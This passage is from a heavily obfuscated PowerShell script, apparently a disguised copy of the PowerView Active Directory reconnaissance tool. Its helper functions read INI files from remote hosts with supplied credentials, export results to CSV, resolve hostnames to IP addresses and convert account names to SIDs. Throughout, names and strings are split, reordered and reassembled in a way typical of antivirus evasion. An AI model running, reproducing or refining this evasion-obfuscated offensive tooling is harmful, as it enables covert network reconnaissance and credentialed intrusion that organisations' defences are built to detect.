    ${Il`Ge`NEra`Tor2}.("{0}{1}" -f'Em','it').Invoke( (  GeT-vAriAbLE  ("{0}{1}" -f 'y9','z')  -VALuEONL  )::"ca`LL",
          ${3R`X`8Iv}.("{1}{0}{2}" -f 'tMetho','Ge','d').Invoke(("{2}{1}{0}{3}"-f 'tu','rToStruc','Pt','re'), [Type[]] @([IntPtr], [Type])))
    ${IL`genE`R`ATo`R2}.("{0}{1}"-f 'Em','it').Invoke(  ( geT-vArIaBlE ("y"+"9Z") )."va`LUe"::"UNBoX`_a`NY", ${STr`U`CT`BuILd`eR})
    ${IlGEner`ATo`R2}.("{0}{1}" -f'E','mit').Invoke( ${Y`9Z}::"r`eT")

    ${St`R`UCtBUi`LDer}.("{1}{0}{2}"-f 'reat','C','eType').Invoke()
}








Function Ne`W-`dYn`AmIc`pARAMeter {


    [CmdletBinding(dEfAuLTPaRameterSETname = {"{0}{1}{3}{2}"-f 'Dynam','i','r','cParamete'})]
    Param (
        [Parameter(manDatORY = ${tr`Ue}, valUEFROmpIpeLine = ${tR`UE}, ValuefROmpIPeLiNEBypROpErTYname = ${tr`Ue}, PaRAMeTErsETNAmE = "d`YNAmi`cPArA`m`EtEr")]
        [ValidateNotNullOrEmpty()]
        [string]${nA`Me},

        [Parameter(VALuEfrOMPipeLINeByProPErtynAmE = ${t`RUe}, pArameTERsEtNAME = "dYNamIc`PArAM`ET`er")]
        [System.Type]${ty`pe} = [int],

        [Parameter(VALUeFRomPiPElinEBypROPERtynaMe = ${tr`UE}, ParAmeTeRSetname = "dyN`A`m`ICPARameteR")]
        [string[]]${a`li`AS},

        [Parameter(VaLUEfRoMpIPElIneByPrOpErTynAME = ${T`RUE}, ParAMeTERsetnamE = "DYNaMicpa`RA`m`E`Ter")]
        [switch]${MaNd`A`TO`RY},

        [Parameter(vAlueFROMPIpeLiNeByPRopertYnAMe = ${TR`Ue}, PARaMeterSEtnAMe = "DYn`Am`IC`PArAmeTeR")]
        [int]${P`OSi`Tion},

        [Parameter(vALuEFrompipELINEBYPROpErtYnamE = ${t`Rue}, ParameTERsetnAME = "DyNamIcp`Ar`AME`T`Er")]
        [string]${hEL`Pm`e`sSagE},

        [Parameter(vaLUEfROMpIPeLInEByprOPeRTYnAME = ${TR`Ue}, PaRAmeTeRsETname = "d`Yn`AMICpa`RaME`TEr")]
        [switch]${DO`Nt`s`How},

        [Parameter(VaLuEFrOmPIPeLIneBYproPERtYnAMe = ${T`RuE}, PAraMetersetnaMe = "dy`Na`mICParA`meT`eR")]
        [switch]${vALU`ef`ROMPIpE`LInE},

        [Parameter(valUefroMpipeLineBYprOperTYnaME = ${T`RuE}, paraMeteRSeTNaME = "Dy`NamI`C`PARam`EtEr")]
        [switch]${VALUefRomPIpeL`IN`eby`prOP`e`RtYnAME},

        [Parameter(valuEfroMpIPeLInEbyPROPeRtYNaME = ${T`RUE}, pAraMetERSETname = "DyNA`mIcP`AramEt`Er")]
        [switch]${vaLUefR`Omre`MAiN`inga`RgU`M`ENTS},

        [Parameter(valueFRoMpiPElINEBYprOPeRTYnAmE = ${tr`Ue}, paraMetErSETnAmE = "Dy`NA`m`ICpAR`AMEteR")]
        [string]${pAr`AmetERse`Tn`AMe} = "_`_alL`PArAME`TE`RSetS",

        [Parameter(valuefromPIPEliNEbYpROpErtyname = ${T`Rue}, pArAmEteRsETnAME = "dy`NaMIcpaRAm`e`TER")]
        [switch]${AL`Lo`WNU`Ll},

        [Parameter(vALUEFromPIPelINeBypRopeRtYNAMe = ${tR`Ue}, pArameTeRseTNaME = "dYNAMI`cp`A`R`AmEtEr")]
        [switch]${allO`we`mP`TystrING},

        [Parameter(vALUeFroMpipElInEbYpROPerTYNaME = ${t`Rue}, paRaMEtErsETname = "dyN`AMiC`Pa`RaMeT`eR")]
        [switch]${A`LL`oW`eMPtyc`olLEctioN},

        [Parameter(ValueFROmPiPElInEbYpropeRtyNamE = ${T`RuE}, pArameTErsEtnaME = "DYN`AMICPa`Ra`METer")]
        [switch]${VA`LIdaTeN`ot`Null},

        [Parameter(ValueFroMpipeLinEbYProperTYnAMe = ${tr`Ue}, parAMeTErsEtname = "D`YNamicpAr`A`meTEr")]
        [switch]${vALID`ATE`Notn`UlL`oREm`pTY},

        [Parameter(VaLUEFrompipELInEByPrOpErTynAmE = ${Tr`UE}, paraMEterSEtnAMe = "d`YNAMIcPa`RaMe`T`Er")]
        [ValidateCount(2,2)]
        [int[]]${VA`L`iDatE`Co`UNT},

        [Parameter(VALuefROMpIPelinEBYPropeRTynAME = ${t`RuE}, PaRamETeRSEtnAME = "D`YnaMiC`Pa`RAmET`Er")]
        [ValidateCount(2,2)]
        [int[]]${vAl`I`D`AterANgE},

        [Parameter(vAlueFROMPIPELIneBYPrOpErTyName = ${Tr`Ue}, PAramETeRsETnamE = "DYNaMicPa`RamEt`Er")]
        [ValidateCount(2,2)]
        [int[]]${VALId`AT`El`ENg`Th},

        [Parameter(ValuefRompipeLinEBYPROpERTynAmE = ${t`RUe}, PaRametErsetNAme = "dyn`AMicp`A`RaM`EteR")]
        [ValidateNotNullOrEmpty()]
        [string]${vAliDaTe`p`Att`ErN},

        [Parameter(vALuefRompIpELinebYpROpeRTYNaME = ${Tr`UE}, PARaMEteRSetnAmE = "dynaMiCp`A`RAM`EtER")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${vALi`d`AtE`scRIPt},

        [Parameter(vaLUEfRompipELiNEbYProperTYnaME = ${t`RUe}, PARAmEtERseTNAME = "d`YnAMi`CPaRaM`etEr")]
        [ValidateNotNullOrEmpty()]
        [string[]]${vAL`I`D`ATESet},

        [Parameter(ValUEfroMPIPeLineByprOpERtyNaMe = ${tr`UE}, PARAMetersetNAMe = "d`Yna`M`ICPaR`AmE`Ter")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{6}{4}{19}{1}{2}{0}{18}{11}{14}{22}{16}{13}{12}{20}{25}{5}{9}{15}{10}{17}{7}{3}{23}{24}{8}{21}" -f 'nary ','i','o','aramet','c','tio','Di','imeDefinedP','ion','n.','u','u','.','agement','st b','R','.Man','nt','m','t','Au','ary object','e a System','erD','ict','toma')
            }
            ${T`Rue}
        })]
        ${dICTi`ON`Ary} = ${f`A`Lse},

        [Parameter(MandatoRy = ${t`Rue}, vALueFROmPIpELiNEbYpropertyname = ${Tr`UE}, ParamEtErsETNAmE = "Cr`E`AtevA`Ria`BLEs")]
        [switch]${C`REa`T`eV`ArIabLES},

        [Parameter(mAndAtorY = ${t`RUE}, vALUeFroMpiPElineBYpRoPErTynaME = ${Tr`Ue}, PAraMEteRseTNAmE = "CrEAtEV`A`R`I`ABLes")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{1}{2}{0}"-f 'pe','G','etTy').Invoke()."na`ME" -notmatch ("{0}{1}{2}" -f 'Di','ctio','nary')) {
                Throw ("{10}{13}{1}{4}{21}{17}{3}{5}{20}{15}{19}{8}{11}{16}{6}{0}{14}{7}{2}{9}{18}{12}{22}"-f 'undParam','ndPa','sDictio',' a','ramet',' Sy','.PSBo','r','t.Au','nar','Bo','tom','jec','u','ete','nageme','ation','e','y ob','n','stem.Ma','ers must b','t')
            }
            ${tr`UE}
        })]
        ${B`OU`N`DPA`RAMeters}
    )

    Begin {
        ${inTe`R`Na`L`DiC`TioNaRy} = &("{3}{2}{1}{0}" -f'ject','Ob','ew-','N') -TypeName ("{0}{7}{14}{9}{6}{1}{3}{5}{13}{11}{15}{12}{10}{17}{16}{2}{4}{8}"-f 'System.','ma','n','ti','a','on.Runti','uto','Man','ry','A','t','edP','rame','meDefin','agement.','a','rDictio','e')
        function _`TEMp { [CmdletBinding()] Param() }
        ${COmmO`Npa`Ra`me`TERS} = (&("{0}{2}{1}" -f'Get-','mand','Com') ("{1}{0}"-f'emp','_t'))."ParAM`E`TERs"."ke`Ys"
    }

    Process {
        if(${c`R`Ea`TevArIA`B`lES}) {
            ${BOu`Ndk`eys} = ${boU`NdP`A`Ra`MEters}."KE`yS" | &("{2}{1}{0}{3}"-f 'O','ere-','Wh','bject') { ${Co`MM`ONParaMet`ers} -notcontains ${_} }
            ForEach(${PA`RA`m`eter} in ${BOuN`d`K`eyS}) {
                if (${pa`RaMEt`ER}) {
                    &("{2}{0}{1}{3}" -f't-Va','riabl','Se','e') -Name ${pA`RA`METER} -Value ${Boun`dPaRA`Me`TE`RS}.${Pa`RAMe`Ter} -Scope 1 -Force
                }
            }
        }
        else {
            ${StALE`kE`yS} = @()
            ${sTal`E`Ke`ys} = ${pSBouNdPa`RaM`e`Te`Rs}.("{3}{2}{0}{1}" -f'to','r','ra','GetEnume').Invoke() |
                        &("{0}{1}{2}{3}"-f'ForEac','h-Ob','jec','t') {
                            if(${_}."Va`Lue"."p`SoBJe`ct"."MeT`h`ODs"."N`Ame" -match (('^'+'Eq'+'uals3ot').("{0}{1}"-f 'Re','pLACe').Invoke('3ot','$'))) {
                                
                                if(!${_}."va`lUE".("{1}{0}" -f'als','Equ').Invoke((&("{0}{1}{2}{3}"-f 'G','et-V','ar','iable') -Name ${_}."k`Ey" -ValueOnly -Scope 0))) {
                                    ${_}."K`ey"
                                }
                            }
                            else {
                                
                                if(${_}."vAL`UE" -ne (&("{0}{2}{1}" -f'G','le','et-Variab') -Name ${_}."K`EY" -ValueOnly -Scope 0)) {
                                    ${_}."K`ey"
                                }
                            }
                        }
            if(${sT`ALeKe`Ys}) {
                ${sTaLe`Ke`yS} | &("{1}{0}{2}{3}" -f'Eac','For','h-O','bject') {[void]${PsbOUNDp`AR`AMetE`Rs}.("{1}{2}{0}" -f've','Re','mo').Invoke(${_})}
            }

            
            ${uN`BO`U`NdPa`RaMeT`erS} = (&("{1}{0}{2}" -f'om','Get-C','mand') -Name (${psCmDl`et}."myin`VOcaT`IoN"."Inv`o`CA`Ti`onnAMe"))."PAr`A`Me`TeRS".("{4}{2}{1}{3}{0}" -f 'or','e','num','rat','GetE').Invoke()  |
                                        
                                        &("{2}{1}{0}{3}" -f'er','h','W','e-Object') { ${_}."VaL`UE"."par`A`MEters`e`Ts"."k`EYs" -contains ${pSC`MdlEt}.pARAmETErseTname } |
                                            &("{2}{1}{0}" -f 't','ec','Select-Obj') -ExpandProperty ("{0}{1}" -f'K','ey') |
                                                
                                                &("{2}{0}{1}" -f 'b','ject','Where-O') { ${PsBoU`N`Dpa`RaMeTeRs}."k`EYS" -notcontains ${_} }

            
            ${T`mp} = ${N`Ull}
            ForEach (${P`ARAmet`Er} in ${unb`Ou`ND`ParaMEteRs}) {
                ${De`FaUl`Tva`LUe} = &("{0}{2}{1}{3}" -f 'Ge','-Variabl','t','e') -Name ${PaR`A`met`ER} -ValueOnly -Scope 0
                if(!${ps`BOUN`Dp`ARaM`e`TERS}."TrY`GETV`AlUE"(${Pa`R`A`MeteR}, [ref]${T`Mp}) -and ${DE`Fa`UlTValUE}) {
                    ${pS`B`oundp`ARa`mE`TerS}.${PAr`AmET`Er} = ${d`EFaU`L`TVAL`Ue}
                }
            }

            if(${di`cTION`A`Ry}) {
                ${d`p`DIct`iOnaRy} = ${D`I`ctionA`RY}
            }
            else {
                ${DpDiC`TIONa`Ry} = ${in`TeRna`lD`I`cTio`NaRY}
            }

            
            ${g`e`TVAr} = {&("{1}{2}{3}{0}" -f 'ble','Ge','t-Va','ria') -Name ${_} -ValueOnly -Scope 0}

            
            ${att`R`IbuTe`RE`GeX} = ((('^(Ma'+'ndatoryTOI'+'Pos'+'it'+'ion'+'TOIP'+'ara'+'m'+'e'+'terS'+'etN'+'ame'+'T'+'OID'+'o'+'n'+'t'+'S'+'howT'+'OI'+'He'+'lpMes'+'s'+'ageTOIVa'+'lueFromPipelineTO'+'I'+'V'+'a'+'lu'+'eFromPi'+'p'+'e'+'l'+'ine'+'ByPr'+'operty'+'Na'+'meTOIVa'+'lu'+'e'+'F'+'romRemain'+'ingArgume'+'nts'+')eFo')-REPLacE  'TOI',[CHAr]124 -cRepLacE'eFo',[CHAr]36))
            ${vAlIdaTiOn`R`eg`Ex} = ((('^'+'(All'+'owNullRftAllowEm'+'ptyStrin'+'g'+'Rf'+'t'+'AllowEmpt'+'yCollectionRftV'+'alidateCoun'+'tRf'+'tValid'+'ateLen'+'g'+'thR'+'ftVal'+'idate'+'P'+'atte'+'rnRftVali'+'date'+'Ran'+'geRf'+'tVal'+'i'+'d'+'a'+'teS'+'cri'+'ptRft'+'Va'+'l'+'id'+'a'+'teSetRftValidate'+'NotNullRftValidateNo'+'tNu'+'llO'+'rEmpty)W73')  -cREPlACe'W73',[CHAR]36 -REpLACE'Rft',[CHAR]124))
            ${aL`ia`SRegEx} = {('^'+'Alias{0'+'}') -F[ChaR]36}
            ${paR`A`MET`ERATTrib`UTE} = &("{2}{0}{1}"-f'ew-Obje','ct','N') -TypeName ("{4}{5}{7}{6}{0}{1}{2}{8}{3}"-f'a','mete','rAtt','bute','Syst','em.Management.','mation.Par','Auto','ri')

            switch -regex (${ps`BoUNd`PAr`A`ME`Ters}."Ke`yS") {
                ${A`TtRIbuTE`RE`GEX} {
                    Try {
                        ${p`Ar`AM`ETera`TT`RIBUTE}.${_} = . ${g`EtV`AR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${dp`di`c`TiONaRy}."k`EYS" -contains ${n`AMe}) {
                ${dpd`I`C`T`iONaRY}.${n`Ame}."ATt`RIB`Utes".("{0}{1}" -f 'A','dd').Invoke(${P`Aram`EtERATTRibu`TE})
            }
            else {
                ${aTTrIB`Ute`c`o`LL`eCTIOn} = &("{2}{1}{0}"-f'ject','w-Ob','Ne') -TypeName ("{8}{4}{11}{7}{2}{9}{0}{1}{3}{5}{6}{10}"-f 'ction[','S','jectMode','y','olle','s','tem.A','Ob','C','l.Colle','ttribute]','ctions.')
                switch -regex (${p`SBOU`N`DP`ArAMetErs}."kE`ys") {
                    ${VA`LiD`A`T`IONrEgEX} {
                        Try {
                            ${pa`R`AMEterOPT`i`oNs} = &("{0}{2}{1}"-f 'New-','ect','Obj') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${ge`TVAR}) -ErrorAction ("{0}{1}" -f 'St','op')
                            ${At`T`RIb`UtE`cOL`l`eCtiOn}.("{1}{0}"-f 'dd','A').Invoke(${PArAM`eTe`RoptI`OnS})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${AliA`s`R`eGeX} {
                        Try {
                            ${PA`R`AMET`ERaLias} = &("{2}{1}{0}" -f 't','ew-Objec','N') -TypeName ("{1}{5}{6}{2}{3}{0}{10}{7}{4}{9}{8}"-f 'nt.Automatio','Syste','ana','geme','a','m','.M','Ali','bute','sAttri','n.') -ArgumentList (. ${g`Et`VAr}) -ErrorAction ("{1}{0}"-f'p','Sto')
                            ${AT`TriBuT`eCo`LLecTION}.("{1}{0}" -f 'dd','A').Invoke(${P`A`RamETeR`AlI`AS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${ATtr`i`BUte`CoLleCTi`ON}.("{0}{1}" -f 'Ad','d').Invoke(${paR`A`mETeRaTtrIBU`TE})
                ${Para`m`EtEr} = &("{2}{0}{1}"-f 'ew-Obj','ect','N') -TypeName ("{0}{8}{2}{4}{9}{5}{1}{12}{6}{7}{11}{3}{10}" -f'Syste','ation','eme','a','nt','m','untimeDefine','dPa','m.Manag','.Auto','meter','r','.R') -ArgumentList @(${na`ME}, ${t`YPe}, ${At`TR`i`BuT`E`CoLLeCTiOn})
                ${dP`D`IC`TIonARY}.("{1}{0}" -f 'dd','A').Invoke(${n`AMe}, ${P`ARAm`eteR})
            }
        }
    }

    End {
        if(!${C`ReAt`eVa`RIAB`lEs} -and !${DIC`TioN`ARy}) {
            ${dp`diCTIOna`Ry}
        }
    }
}


function gET`-`iNic`oNTEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}"-f'SShoul','Process','d','P'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIOn = 0, mANDaToRY = ${tr`UE}, valuEfromPIpeLINe = ${T`Rue}, vaLUEFromPIpELInEByproperTyNAmE = ${t`RUe})]
        [Alias({"{1}{2}{0}" -f 'e','FullN','am'}, {"{1}{0}"-f 'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pa`TH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`edEntiaL} =  (  vArIaBLE ("Q"+"Fn") -valUeOnl )::"e`MPty",

        [Switch]
        ${ou`Tp`Utob`Ject}
    )

    BEGIN {
        ${m`A`PpedCoM`P`UTeRs} = @{}
    }

    PROCESS {
        ForEach (${T`A`Rgetp`ATH} in ${pA`TH}) {
            if ((${t`A`RGE`TpatH} -Match ((("{3}{1}{0}{2}{5}{4}" -f '{0}{','0}','0}.*{0}{','{0}{','.*','0}'))-f[CHar]92)) -and (${pSB`O`UNdP`A`Rame`TERS}[("{0}{3}{1}{2}"-f 'Cr','denti','al','e')])) {
                ${h`ostC`oMput`er} = (&("{1}{2}{0}"-f't','Ne','w-Objec') ("{3}{2}{0}{1}"-f'r','i','em.U','Syst')(${ta`RGEtPA`Th}))."ho`ST"
                if (-not ${MaPPEd`cOM`pUt`ers}[${h`o`S`TcomPUT`er}]) {
                    
                    &("{6}{3}{5}{1}{2}{0}{4}"-f 'c','Con','ne','R','tion','emote','Add-') -ComputerName ${h`os`TCOm`PuTeR} -Credential ${cRE`D`E`NTiaL}
                    ${mA`PPeDC`oMPut`e`Rs}[${hOs`TcoM`P`Ut`eR}] = ${T`RUE}
                }
            }

            if (&("{1}{0}{2}"-f 'at','Test-P','h') -Path ${TarGe`Tp`ATh}) {
                if (${P`SboUndp`A`RaMEteRs}[("{2}{0}{1}" -f 'Obje','ct','Output')]) {
                    ${iN`IoBj`eCT} = &("{1}{0}{2}"-f 'ew-','N','Object') ("{0}{2}{1}"-f'PS','ect','Obj')
                }
                else {
                    ${Inio`BJ`ECt} = @{}
                }
                Switch -Regex -File ${tArGE`Tp`A`Th} {
                    ((("{1}{0}"-f 'xUH[(.+)xUH]','^'))."Re`p`lAce"(([ChAR]120+[ChAR]85+[ChAR]72),[STRiNg][ChAR]92)) 
                    {
                        ${S`ec`TION} = ${M`A`TCHes}[1].("{0}{1}"-f 'Tr','im').Invoke()
                        if (${ps`BouNDpARAME`T`ers}[("{0}{1}{2}"-f'Ou','tputOb','ject')]) {
                            ${SecTi`ON} = ${sE`ctIon}.("{1}{0}" -f'place','Re').Invoke(' ', '')
                            ${se`CT`IoN`objE`CT} = &("{2}{0}{1}" -f'Obje','ct','New-') ("{1}{2}{0}"-f 'ject','PSO','b')
                            ${iniobJ`e`CT} | &("{0}{1}{2}"-f 'A','dd-Memb','er') ("{0}{2}{1}"-f 'Notepro','erty','p') ${SEc`Ti`on} ${S`EctiO`NO`BJecT}
                        }
                        else {
                            ${In`i`oBje`CT}[${S`E`CtION}] = @{}
                        }
                        ${com`MentCoU`Nt} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${VA`Lue} = ${MaTCH`ES}[1].("{1}{0}" -f'im','Tr').Invoke()
                        ${cOmME`NT`COU`NT} = ${COM`M`en`TCOuNt} + 1
                        ${n`AmE} = ("{0}{1}" -f 'Com','ment') + ${coMme`Nt`C`oUnT}
                        if (${PSBoU`N`d`PARAmeTERs}[("{0}{3}{2}{1}"-f'Outpu','t','c','tObje')]) {
                            ${n`AmE} = ${na`Me}.("{1}{2}{0}" -f 'e','Repla','c').Invoke(' ', '')
                            ${iNi`ObJ`ecT}.${S`ec`Tion} | &("{0}{1}{3}{2}"-f'Ad','d-Me','er','mb') ("{0}{2}{1}" -f 'Notep','ty','roper') ${n`Ame} ${vaL`UE}
                        }
                        else {
                            ${IN`I`objecT}[${sect`I`On}][${Na`mE}] = ${Va`L`UE}
                        }
                    }
                    ((("{2}{3}{0}{1}"-f '.','*)','(.+?)rH','Rs*=('))."RE`plA`cE"(([Char]114+[Char]72+[Char]82),'\')) 
                    {
                        ${na`mE}, ${v`A`luE} = ${maTc`HES}[1..2]
                        ${N`AMe} = ${nA`mE}.("{0}{1}" -f'T','rim').Invoke()
                        ${Val`U`eS} = ${V`AlUE}.("{1}{0}"-f'lit','sp').Invoke(',') | &("{2}{0}{1}"-f'orEa','ch-Object','F') { ${_}.("{0}{1}"-f'T','rim').Invoke() }

                        

                        if (${pSB`Oun`dP`AraMETeRs}[("{3}{0}{1}{2}"-f 'ut','p','utObject','O')]) {
                            ${na`ME} = ${Na`ME}.("{1}{0}{2}"-f 'pl','Re','ace').Invoke(' ', '')
                            ${I`NioB`jECt}.${sE`ction} | &("{2}{0}{1}" -f'dd','-Member','A') ("{0}{2}{1}" -f 'N','y','otepropert') ${NA`me} ${VA`LueS}
                        }
                        else {
                            ${I`NI`o`BjeCT}[${s`EcTI`on}][${n`AmE}] = ${val`UeS}
                        }
                    }
                }
                ${i`Nio`BJECT}
            }
        }
    }

    END {
        
        ${MapPeD`Co`m`Pute`RS}."k`eyS" | &("{3}{6}{5}{2}{4}{1}{0}" -f 'on','necti','-Remot','Re','eCon','ve','mo')
    }
}


function EX`P`ORT-Pow`e`R`ViEWcsv {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f 'houl','PSS','dProces','s'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(MAndAtoRY = ${T`RUe}, vaLueFROMpiPeliNe = ${TR`UE}, vaLUEFrOmPIPeLIneBYPrOpERtYNaME = ${tr`UE})]
        [System.Management.Automation.PSObject[]]
        ${iN`p`UT`OBjECT},

        [Parameter(MAndatORy = ${Tr`UE}, PoSITIOn = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Pa`TH},

        [Parameter(PoSitIoN = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${deL`I`mItEr} = ',',

        [Switch]
        ${A`p`peNd}
    )

    BEGIN {
        ${o`U`Tp`UtpATh} =   (  gEt-VaRIAbLe ("{0}{1}"-f'N2yW','K'))."va`luE"::"gE`TFUL`lpatH"(${PsbO`Un`DpARaM`eTeRs}[("{0}{1}" -f 'Pa','th')])
        ${ex`ISts} =  (  VAriAble  ("{0}{1}" -f'A','10')  -vALUeO )::("{1}{0}" -f'ists','Ex').Invoke(${O`U`Tpu`TPAtH})

        
        ${Mu`TeX} = &("{2}{0}{1}"-f'-Obje','ct','New') ("{2}{4}{1}{3}{0}" -f'utex','m.T','S','hreading.M','yste') ${fA`l`sE},("{2}{0}{1}" -f'Mut','ex','CSV')
        ${n`UlL} = ${M`UtEx}.("{0}{1}{2}" -f 'Wa','itO','ne').Invoke()

        if (${psb`o`Und`pARAmEtERs}[("{0}{1}"-f 'Ap','pend')]) {
            ${Fi`lemO`DE} =   ( VAriable ("{0}{1}"-f'Tg','1eS') )."Val`Ue"::"apP`END"
        }
        else {
            ${fI`L`E`MOdE} =  ( cHILditEM ("{4}{0}{3}{2}{1}"-f'rI','es','e:tg1','ABL','va')  )."val`UE"::"CR`eAte"
            ${E`xi`sts} = ${Fal`Se}
        }

        ${Cs`VsTr`EaM} = &("{2}{1}{0}" -f't','-Objec','New') ("{0}{3}{2}{1}" -f 'I','tream','ileS','O.F')(${o`UTpu`TPAtH}, ${fIL`emOdE},   (  Gi  ("{1}{3}{0}{4}{2}" -f 'B','vaR',':levq','Ia','lE'))."vA`LUE"::"W`RIte",  ${Dw4`O`V7}::"R`EAd")
        ${CsvwR`It`Er} = &("{1}{0}{3}{2}" -f 'w-Obj','Ne','ct','e') ("{0}{3}{2}{4}{1}"-f 'Syst','treamWriter','IO.','em.','S')(${cSVSt`R`EAM})
        ${c`SVWR`iT`ER}."Au`To`FluSh" = ${T`RuE}
    }

    PROCESS {
        ForEach (${e`N`TrY} in ${iNpuT`objE`cT}) {
            ${obJ`EcT`cSV} = &("{2}{1}{0}"-f 'v','rtTo-Cs','Conve') -InputObject ${EN`T`Ry} -Delimiter ${Deli`miT`ER} -NoTypeInformation

            if (-not ${E`Xi`STs}) {
                
                ${O`BJ`ECTcSV} | &("{0}{3}{2}{1}" -f'ForEac','ct','e','h-Obj') { ${cSV`wr`iTer}.("{0}{1}{2}"-f 'Writ','eLi','ne').Invoke(${_}) }
                ${e`XiStS} = ${T`RuE}
            }
            else {
                
                ${OB`jEcTC`SV}[1..(${o`BJect`cSV}."L`EN`gth"-1)] | &("{2}{0}{3}{1}"-f 'rE','bject','Fo','ach-O') { ${csv`wrIT`ER}.("{2}{0}{1}"-f 'teLin','e','Wri').Invoke(${_}) }
            }
        }
    }

    END {
        ${m`UTEx}.("{3}{1}{0}{2}" -f 'a','e','seMutex','Rel').Invoke()
        ${cS`VwRi`TER}.("{1}{0}{2}" -f 's','Dispo','e').Invoke()
        ${c`Sv`Stream}.("{1}{0}"-f'ose','Disp').Invoke()
    }
}


function re`s`o`LV`e-`IPaDDREss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}{4}"-f'ld','Shou','PS','Pr','ocess'}, '')]
    [OutputType({"{1}{7}{3}{6}{2}{0}{8}{5}{4}"-f't.Automati','Sy','emen','em.Ma','ect','n.PSCustomObj','nag','st','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTiOn = 0, valuefROMpipeline = ${T`RUe}, valuEFROMpIpELINEBYpRoPERtynAmE = ${t`Rue})]
        [Alias({"{1}{0}" -f'Name','Host'}, {"{2}{1}{0}"-f 'e','ostnam','dnsh'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoMP`UTeR`N`AME} = ${en`V:c`O`mpUtE`RNAmE}
    )

    PROCESS {
        ForEach (${co`MpU`Ter} in ${COM`pute`RnAme}) {
            try {
                @(( ( gET-variable ("sL"+"FyZ") )."Val`UE"::("{1}{2}{0}" -f 'y','GetHo','stEntr').Invoke(${COMpu`TEr}))."aDD`R`E`SSLISt") | &("{3}{2}{4}{0}{1}" -f 'bj','ect','ac','ForE','h-O') {
                    if (${_}."AdDre`Ssf`Am`I`LY" -eq ("{0}{1}{2}" -f'InterNe','tw','ork')) {
                        ${O`UT} = &("{0}{1}{2}"-f 'New-O','bj','ect') ("{1}{2}{0}"-f 'ct','PSO','bje')
                        ${O`Ut} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{1}{3}{0}{2}" -f'propert','No','y','te') ("{1}{2}{0}" -f'ame','Compute','rN') ${coM`P`UTEr}
                        ${O`UT} | &("{1}{0}{3}{2}"-f'em','Add-M','r','be') ("{1}{2}{3}{0}"-f'rty','Notepro','p','e') ("{1}{0}{2}"-f 'dres','IPAd','s') ${_}."Ipa`dd`ReSs`To`strINg"
                        ${O`UT}
                    }
                }
            }
            catch {
                &("{1}{3}{0}{2}" -f'Verbos','Wri','e','te-') ('[Reso'+'l'+'ve'+'-IPAd'+'dress]'+' '+'Coul'+'d '+'no'+'t '+'re'+'so'+'lve '+"$Computer "+'t'+'o '+'an'+' '+'I'+'P '+'Addre'+'s'+'s.')
            }
        }
    }
}


function C`Onv`Ertt`O`-sid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{1}{2}" -f'PS','c','ess','o','ShouldPr'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mAndatoRy = ${T`RuE}, vaLUEFrOmpIPeLINe = ${T`Rue}, vaLuefrOmPipelINeBypROpertYnaME = ${T`RuE})]
        [Alias({"{0}{1}" -f 'Na','me'}, {"{0}{1}{2}"-f'I','de','ntity'})]
        [String[]]
        ${OBJe`c`TNa`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{4}{1}"-f'omainCon','r','t','D','rolle'})]
        [String]
        ${Se`RVER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDEn`Ti`Al} =  (vAriaBLe  ("{1}{0}"-f 'n','qF')  -Va  )::"emP`Ty"
    )

    BEGIN {
        ${domaiNse`AR`che`RarGuME`Nts} = @{}
        if (${pS`B`OUnD`PARA`m`EteRs}[("{0}{1}"-f'Dom','ain')]) { ${do`mAINSEa`RCH`E`RARgUM`E`N`Ts}[("{1}{0}" -f'n','Domai')] = ${d`om`AIN} }
        if (${pSB`ouNdp`AR`AME`TeRS}[("{1}{0}"-f'erver','S')]) { ${do`ma`I`NsearcHerARgUm`enTs}[("{1}{0}"-f 'er','Serv')] = ${S`ErVER} }
        if (${psBO`U`NDPA`RaMEt`E`RS}[("{2}{0}{1}"-f'redentia','l','C')]) { ${dOmA`I`N`sE`ARcheRargU`mentS}[("{3}{2}{1}{0}" -f 'l','a','denti','Cre')] = ${Cr`eDENT`iAL} }
    }

    PROCESS {
        ForEach (${oB`JE`cT} in ${OB`je`CT`NAME}) {
            ${ObJE`ct} = ${o`B`jEcT} -Replace '/','\'

            if (${p`sboUnDp`AR`AMe`TErs}[("{2}{1}{0}"-f'ntial','e','Cred')]) {
                ${D`N} = &("{1}{0}{2}{3}{4}" -f'onv','C','ert-ADN','a','me') -Identity ${Obj`E`cT} -OutputType 'DN' @DomainSearcherArguments
                if (${D`N}) {
                    ${u`seR`dOmAiN} = ${Dn}.("{1}{0}" -f 'ing','SubStr').Invoke(${D`N}.("{1}{2}{0}" -f'Of','In','dex').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${u`seRNa`me} = ${D`N}.("{0}{1}"-f 'S','plit').Invoke(',')[0].("{0}{1}" -f 'spl','it').Invoke('=')[1]

